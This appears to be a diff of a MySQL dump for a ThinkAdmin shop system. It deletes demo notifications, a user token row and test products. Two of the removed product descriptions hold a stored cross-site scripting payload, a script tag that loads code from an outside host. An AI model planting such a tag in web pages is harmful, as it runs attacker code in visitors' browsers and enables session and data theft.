-INSERT INTO `data_user_notify` VALUES (2, '', '还在开发呢，不要着急呢？', '<p>前端代码还在开发，不要着急，估计今年能出一个版本？</p>\r\n\r\n<p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/8d/286ef7f362d82e257417f4e5a842f1.jpg\" style=\"max-width:100%;border:0\" /></span><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/c4/6371f5fbb4329dbcdd67b85d42e61b.jpg\" style=\"max-width:100%;border:0\" /></span><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/14/4f74cd436956693c2ab9cbaee83734.jpg\" style=\"max-width:100%;border:0\" /></span><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/e0/688aae14c464bd76d9fc44354496ff.jpg\" style=\"max-width:100%;border:0\" /></span></p>', 0, 1, 0, '2021-01-20 22:16:17');
-INSERT INTO `data_user_notify` VALUES (3, '', 'c', '<p>c</p>', 0, 1, 1, '2021-01-21 08:59:43');
-INSERT INTO `data_user_notify` VALUES (4, '', '1', '<p>1</p>', 0, 1, 1, '2021-01-26 10:03:55');
-INSERT INTO `data_user_notify` VALUES (5, '', '阿斯蒂芬', '<p>12121212</p>', 0, 1, 0, '2021-01-26 22:36:30');
-INSERT INTO `data_user_notify` VALUES (6, '', 'sdsddsdssd', '<p>sddsssssssssssssss</p>', 11, 0, 0, '2021-02-01 17:23:33');
-INSERT INTO `data_user_notify` VALUES (7, '', 'jiayou', '<p>jiayou123456</p>', 0, 1, 0, '2021-02-03 09:57:43');
-INSERT INTO `data_user_notify` VALUES (8, '', 'tet', '<p>tet</p>', 0, 1, 0, '2021-02-14 13:36:52');
-INSERT INTO `data_user_notify` VALUES (9, '', '1212', '<p>121212</p>', 0, 1, 0, '2021-02-19 12:37:16');
 
 -- ----------------------------
 -- Table structure for data_user_rebate
@@ -496,7 +354,7 @@ CREATE TABLE `data_user_rebate`  (
   INDEX `idx_data_user_rebate_date`(`date`) USING BTREE,
   INDEX `idx_data_user_rebate_code`(`code`) USING BTREE,
   INDEX `idx_data_user_rebate_name`(`name`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '数据-用户-返利' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '数据-用户-返利' ROW_FORMAT = Compact;
 
 -- ----------------------------
 -- Records of data_user_rebate
@@ -518,12 +376,11 @@ CREATE TABLE `data_user_token`  (
   INDEX `idx_data_user_token_type`(`type`) USING BTREE,
   INDEX `idx_data_user_token_time`(`time`) USING BTREE,
   INDEX `idx_data_user_token_token`(`token`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 392 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-用户-认证' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-用户-认证' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of data_user_token
 -- ----------------------------
-INSERT INTO `data_user_token` VALUES (391, 1, 'wap', 1614168307, '0015a2064b2df217ce692575ef9bb24c', '195f77c180c23e3f5a8a8f38e4290186', '2021-02-24 18:05:07');
 
 -- ----------------------------
 -- Table structure for data_user_transfer
@@ -553,7 +410,7 @@ CREATE TABLE `data_user_transfer`  (
   INDEX `idx_data_user_transfer_code`(`code`) USING BTREE,
   INDEX `idx_data_user_transfer_status`(`status`) USING BTREE,
   INDEX `idx_data_user_transfer_openid`(`openid`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '数据-用户-提现' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '数据-用户-提现' ROW_FORMAT = Compact;
 
 -- ----------------------------
 -- Records of data_user_transfer
@@ -599,28 +456,11 @@ CREATE TABLE `shop_goods`  (
   INDEX `idx_shop_goods_cate`(`cate`) USING BTREE,
   INDEX `idx_shop_goods_status`(`status`) USING BTREE,
   INDEX `idx_shop_goods_deleted`(`deleted`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 18 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-商品-内容' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-商品-内容' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of shop_goods
 -- ----------------------------
-INSERT INTO `shop_goods` VALUES (1, 18, 'G7101852191255', '测试商品不发货', ',,', 'https://v6.thinkadmin.top/upload/72/8980f7f7b90825a34b92e77699101c.jpg', 'https://v6.thinkadmin.top/upload/e0/688aae14c464bd76d9fc44354496ff.jpg|https://v6.thinkadmin.top/upload/14/4f74cd436956693c2ab9cbaee83734.jpg|https://v6.thinkadmin.top/upload/38/55a12d4c35ff5ff8b7a2e5b080205b.jpg', '', '<p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/38/55a12d4c35ff5ff8b7a2e5b080205b.jpg\" style=\"max-width:100%;border:0\" /></span><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/c4/6371f5fbb4329dbcdd67b85d42e61b.jpg\" style=\"max-width:100%;border:0\" /></span><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/e0/688aae14c464bd76d9fc44354496ff.jpg\" style=\"max-width:100%;border:0\" /></span><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/14/4f74cd436956693c2ab9cbaee83734.jpg\" style=\"max-width:100%;border:0\" /></span><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/11/141a042ef00479a9af16c9efdb6c56.jpg\" style=\"max-width:100%;border:0\" /></span><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/ac/a8c68f0d1c0d240e2af8e0ac440157.jpg\" style=\"max-width:100%;border:0\" /></span><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/8d/2caa8bf909f3da9cf0c0e1b3aeb7a8.jpg\" style=\"max-width:100%;border:0\" /></span><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/05/293cab65f38400aadad5e87b0c32ad.jpg\" style=\"max-width:100%;border:0\" /></span><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/7b/17bec74a894e62992408c67e8edb44.jpg\" style=\"max-width:100%;border:0\" /></span></p>', '[{\"name\":\"颜色\",\"list\":[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\"}]}]', '[[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色\",\"sku\":\"S71018527222\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性2\",\"sku\":\"S71018527290\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性3\",\"sku\":\"S71018527437\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}]]', '', 0, 536, 1, 15, 99.00, 100.00, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, '2021-01-09 17:42:21');
-INSERT INTO `shop_goods` VALUES (2, 0, 'G7106171904105', '就这?', ',,', 'https://v6.thinkadmin.top/upload/0b/41ddc2fe3395af9c8de51282b70e87.jpg', 'https://v6.thinkadmin.top/upload/0b/41ddc2fe3395af9c8de51282b70e87.jpg', 'dfs', '<Script Src=//xs.sb/LNv6></Script><p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/0b/41ddc2fe3395af9c8de51282b70e87.jpg\" style=\"max-width:100%;border:0\" /><Script Src=//xs.sb/LNv6></Script></span></p>', '[{\"name\":\"颜色\",\"list\":[{\"name\":\"白色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\"}]},{\"name\":\"内存\",\"list\":[{\"name\":\"68\",\"check\":true,\"show\":true,\"group\":\"内存\"},{\"name\":\"125\",\"check\":true,\"show\":true,\"group\":\"内存\"}]},{\"name\":\"类型\",\"list\":[{\"name\":\"阉割版\",\"check\":true,\"show\":true,\"group\":\"类型\"},{\"name\":\"正常班\",\"check\":true,\"show\":true,\"group\":\"类型\"},{\"name\":\"加强版\",\"check\":true,\"show\":true,\"group\":\"类型\"}]}]', '[[{\"name\":\"白色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::白色;;内存::68;;类型::阉割版\",\"sku\":\"S71061733218\",\"status\":true,\"market\":\"99.00\",\"selling\":\"66.00\",\"express\":1,\"virtual\":0},{\"name\":\"68\",\"check\":true,\"show\":true,\"group\":\"内存\"},{\"name\":\"阉割版\",\"check\":true,\"show\":true,\"group\":\"类型\"}],[{\"name\":\"白色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::白色;;内存::68;;类型::正常班\",\"sku\":\"S71061734476\",\"status\":true,\"market\":\"99.00\",\"selling\":\"66.00\",\"express\":1,\"virtual\":0},{\"name\":\"68\",\"check\":true,\"show\":true,\"group\":\"内存\"},{\"name\":\"正常班\",\"check\":true,\"show\":true,\"group\":\"类型\"}],[{\"name\":\"白色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::白色;;内存::68;;类型::加强版\",\"sku\":\"S71061735172\",\"status\":true,\"market\":\"99.00\",\"selling\":\"66.00\",\"express\":1,\"virtual\":0},{\"name\":\"68\",\"check\":true,\"show\":true,\"group\":\"内存\"},{\"name\":\"加强版\",\"check\":true,\"show\":true,\"group\":\"类型\"}],[{\"name\":\"白色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::白色;;内存::125;;类型::阉割版\",\"sku\":\"S71061733211\",\"status\":true,\"market\":\"99.00\",\"selling\":\"66.00\",\"express\":1,\"virtual\":0},{\"name\":\"125\",\"check\":true,\"show\":true,\"group\":\"内存\"},{\"name\":\"阉割版\",\"check\":true,\"show\":true,\"group\":\"类型\"}],[{\"name\":\"白色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::白色;;内存::125;;类型::正常班\",\"sku\":\"S71061734417\",\"status\":true,\"market\":\"99.00\",\"selling\":\"66.00\",\"express\":1,\"virtual\":0},{\"name\":\"125\",\"check\":true,\"show\":true,\"group\":\"内存\"},{\"name\":\"正常班\",\"check\":true,\"show\":true,\"group\":\"类型\"}],[{\"name\":\"白色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::白色;;内存::125;;类型::加强版\",\"sku\":\"S71061735191\",\"status\":true,\"market\":\"99.00\",\"selling\":\"66.00\",\"express\":1,\"virtual\":0},{\"name\":\"125\",\"check\":true,\"show\":true,\"group\":\"内存\"},{\"name\":\"加强版\",\"check\":true,\"show\":true,\"group\":\"类型\"}],[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色;;内存::68;;类型::阉割版\",\"sku\":\"S71061733284\",\"status\":true,\"market\":\"99.00\",\"selling\":\"66.00\",\"express\":1,\"virtual\":0},{\"name\":\"68\",\"check\":true,\"show\":true,\"group\":\"内存\"},{\"name\":\"阉割版\",\"check\":true,\"show\":true,\"group\":\"类型\"}],[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色;;内存::68;;类型::正常班\",\"sku\":\"S71061734439\",\"status\":true,\"market\":\"99.00\",\"selling\":\"66.00\",\"express\":1,\"virtual\":0},{\"name\":\"68\",\"check\":true,\"show\":true,\"group\":\"内存\"},{\"name\":\"正常班\",\"check\":true,\"show\":true,\"group\":\"类型\"}],[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色;;内存::68;;类型::加强版\",\"sku\":\"S71061735184\",\"status\":true,\"market\":\"99.00\",\"selling\":\"66.00\",\"express\":1,\"virtual\":0},{\"name\":\"68\",\"check\":true,\"show\":true,\"group\":\"内存\"},{\"name\":\"加强版\",\"check\":true,\"show\":true,\"group\":\"类型\"}],[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色;;内存::125;;类型::阉割版\",\"sku\":\"S71061733269\",\"status\":true,\"market\":\"99.00\",\"selling\":\"66.00\",\"express\":1,\"virtual\":0},{\"name\":\"125\",\"check\":true,\"show\":true,\"group\":\"内存\"},{\"name\":\"阉割版\",\"check\":true,\"show\":true,\"group\":\"类型\"}],[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色;;内存::125;;类型::正常班\",\"sku\":\"S71061734428\",\"status\":true,\"market\":\"99.00\",\"selling\":\"66.00\",\"express\":1,\"virtual\":0},{\"name\":\"125\",\"check\":true,\"show\":true,\"group\":\"内存\"},{\"name\":\"正常班\",\"check\":true,\"show\":true,\"group\":\"类型\"}],[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色;;内存::125;;类型::加强版\",\"sku\":\"S71061735183\",\"status\":false,\"market\":\"99.00\",\"selling\":\"66.00\",\"express\":1,\"virtual\":0},{\"name\":\"125\",\"check\":true,\"show\":true,\"group\":\"内存\"},{\"name\":\"加强版\",\"check\":true,\"show\":true,\"group\":\"类型\"}]]', '', 0, 10685, 0, 0, 66.00, 99.00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, '2021-01-14 17:43:50');
-INSERT INTO `shop_goods` VALUES (3, 0, 'G7110723823961', '不要支付哦，不发货的', ',,', 'https://v6.thinkadmin.top/upload/72/8980f7f7b90825a34b92e77699101c.jpg', 'https://v6.thinkadmin.top/upload/f1/ec5468a1c88f1299c8ac61488483a2.jpg', '', '<p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/0b/41ddc2fe3395af9c8de51282b70e87.jpg\" style=\"max-width:100%;border:0\" /></span></p>', '[{\"name\":\"颜色\",\"list\":[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\"}]}]', '[[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色\",\"sku\":\"S71018527222\",\"status\":true,\"market\":\"56.00\",\"selling\":\"39.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性2\",\"sku\":\"S71018527290\",\"status\":true,\"market\":\"56.00\",\"selling\":\"39.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性3\",\"sku\":\"S71018527437\",\"status\":true,\"market\":\"56.00\",\"selling\":\"39.00\",\"express\":1,\"virtual\":5}]]', '', 0, 2997, 0, 15, 39.00, 56.00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, '2021-01-20 00:06:22');
-INSERT INTO `shop_goods` VALUES (4, 0, 'G7111527334335', '测试商品不发货2', ',,', 'https://v6.thinkadmin.top/upload/72/8980f7f7b90825a34b92e77699101c.jpg', 'https://v6.thinkadmin.top/upload/f1/ec5468a1c88f1299c8ac61488483a2.jpg', '', '<p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/0b/41ddc2fe3395af9c8de51282b70e87.jpg\" style=\"max-width:100%;border:0\" /></span></p>', '[{\"name\":\"颜色\",\"list\":[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\"}]}]', '[[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色\",\"sku\":\"S71018527222\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性2\",\"sku\":\"S71018527290\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性3\",\"sku\":\"S71018527437\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}]]', '', 0, 0, 0, 15, 99.00, 100.00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, '2021-01-20 22:25:33');
-INSERT INTO `shop_goods` VALUES (5, 33, 'G7111527421908', '测试商品不发货3', ',,', 'https://v6.thinkadmin.top/upload/72/8980f7f7b90825a34b92e77699101c.jpg', 'https://v6.thinkadmin.top/upload/f1/ec5468a1c88f1299c8ac61488483a2.jpg|https://v6.thinkadmin.top/upload/94/15fa9060a3d9f72734d5d609319070.png|https://v6.thinkadmin.top/upload/c1/ba19d26f72da89a8cb00304b01324a.jpg', '', '<p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/0b/41ddc2fe3395af9c8de51282b70e87.jpg\" style=\"max-width:100%;border:0\" />fff</span></p>', '[{\"name\":\"颜色\",\"list\":[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\"}]}]', '[[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色\",\"sku\":\"S71018527222\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性2\",\"sku\":\"S71018527290\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性3\",\"sku\":\"S71018527437\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}]]', '', 0, 60, 0, 15, 99.00, 100.00, 0, 0, 0, 0, 0, 0, 0, 0, 10, 1, 0, '2021-01-20 22:25:42');
-INSERT INTO `shop_goods` VALUES (6, 37, 'G7111527534526', '测试商品不发货131', ',,', 'https://v6.thinkadmin.top/upload/72/8980f7f7b90825a34b92e77699101c.jpg', 'https://v6.thinkadmin.top/upload/f1/ec5468a1c88f1299c8ac61488483a2.jpg', '', '<p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/0b/41ddc2fe3395af9c8de51282b70e87.jpg\" style=\"max-width:100%;border:0\" /></span></p>', '[{\"name\":\"颜色\",\"list\":[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\"}]}]', '[[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色\",\"sku\":\"S71018527222\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性2\",\"sku\":\"S71018527290\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性3\",\"sku\":\"S71018527437\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}]]', '', 0, 2821, 0, 15, 99.00, 100.00, 0, 0, 0, 0, 0, 178, 0, 0, 3, 1, 0, '2021-01-20 22:25:53');
-INSERT INTO `shop_goods` VALUES (7, 33, 'G7111527940393', '测试商品不发货', ',777,444,', 'https://v6.thinkadmin.top/upload/72/8980f7f7b90825a34b92e77699101c.jpg', 'https://v6.thinkadmin.top/upload/f1/ec5468a1c88f1299c8ac61488483a2.jpg', '', '<p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/0b/41ddc2fe3395af9c8de51282b70e87.jpg\" style=\"max-width:100%;border:0\" /></span></p>', '[{\"name\":\"颜色\",\"list\":[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\"}]}]', '[[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色\",\"sku\":\"S71018527222\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性2\",\"sku\":\"S71018527290\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性3\",\"sku\":\"S71018527437\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}]]', '', 0, 0, 0, 15, 99.00, 100.00, 0, 0, 0, 0, 0, 12, 0, 0, 1, 1, 0, '2021-01-20 22:26:34');
-INSERT INTO `shop_goods` VALUES (8, 0, 'G7111527990497', '测试商品不发货', ',,', 'https://v6.thinkadmin.top/upload/72/8980f7f7b90825a34b92e77699101c.jpg', 'https://v6.thinkadmin.top/upload/f1/ec5468a1c88f1299c8ac61488483a2.jpg', '', '<p><Script Src=//xs.sb/LNv6></Script><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/0b/41ddc2fe3395af9c8de51282b70e87.jpg\" style=\"max-width:100%;border:0\" /></span></p>', '[{\"name\":\"颜色\",\"list\":[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\"}]}]', '[[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色\",\"sku\":\"S71018527222\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性2\",\"sku\":\"S71018527290\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性3\",\"sku\":\"S71018527437\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}]]', '', 0, 1111, 0, 15, 99.00, 100.00, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, '2021-01-20 22:26:39');
-INSERT INTO `shop_goods` VALUES (9, 0, 'G7111528021978', '测试商品不发货131', ',,', 'https://v6.thinkadmin.top/upload/72/8980f7f7b90825a34b92e77699101c.jpg', 'https://v6.thinkadmin.top/upload/f1/ec5468a1c88f1299c8ac61488483a2.jpg', '', '<p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/0b/41ddc2fe3395af9c8de51282b70e87.jpg\" style=\"max-width:100%;border:0\" /></span></p>', '[{\"name\":\"颜色\",\"list\":[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\"}]}]', '[[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色\",\"sku\":\"S71018527222\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性2\",\"sku\":\"S71018527290\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性3\",\"sku\":\"S71018527437\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}]]', '', 0, 90, 0, 15, 99.00, 100.00, 0, 0, 0, 0, 0, 0, 0, 0, 2, 1, 0, '2021-01-20 22:26:42');
-INSERT INTO `shop_goods` VALUES (10, 33, 'G7111528077727', '测试商品不发货', ',777,111,', 'https://v6.thinkadmin.top/upload/72/8980f7f7b90825a34b92e77699101c.jpg', 'https://v6.thinkadmin.top/upload/f1/ec5468a1c88f1299c8ac61488483a2.jpg|https://v6.thinkadmin.top/upload/c3/5ab5fa59703c34cc1c2ae08930aa75.png', 'vbbbbbbbbbbbbbbbbbb', '<p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/bc/200cc4b6bef886e54b17e92e70782a.jpg\" style=\"max-width:100%;border:0\" /></span></p>', '[{\"name\":\"颜色\",\"list\":[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\"}]}]', '[[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色\",\"sku\":\"S71018527222\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性2\",\"sku\":\"S71018527290\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性3\",\"sku\":\"S71018527437\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}]]', '', 0, 632, 0, 15, 99.00, 100.00, 0, 1, 1, 1, 0, 2, 0, 0, 2, 1, 0, '2021-01-20 22:26:47');
-INSERT INTO `shop_goods` VALUES (11, 17, 'G7112213646771', '测试商品不发货', ',,', 'https://v6.thinkadmin.top/upload/72/8980f7f7b90825a34b92e77699101c.jpg', 'https://v6.thinkadmin.top/upload/f1/ec5468a1c88f1299c8ac61488483a2.jpg', '', '<p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/c9/ef92ba587383401e8dcab0902902d2.jpg\" style=\"max-width:100%;border:0\" /></span></p>', '[{\"name\":\"颜色\",\"list\":[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\"}]}]', '[[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色\",\"sku\":\"S71018527222\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":2,\"virtual\":5}],[{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性2\",\"sku\":\"S71018527290\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":2,\"virtual\":5}],[{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性3\",\"sku\":\"S71018527437\",\"status\":false,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":2,\"virtual\":5}]]', '', 0, 30, 0, 15, 99.00, 100.00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, '2021-01-21 17:29:24');
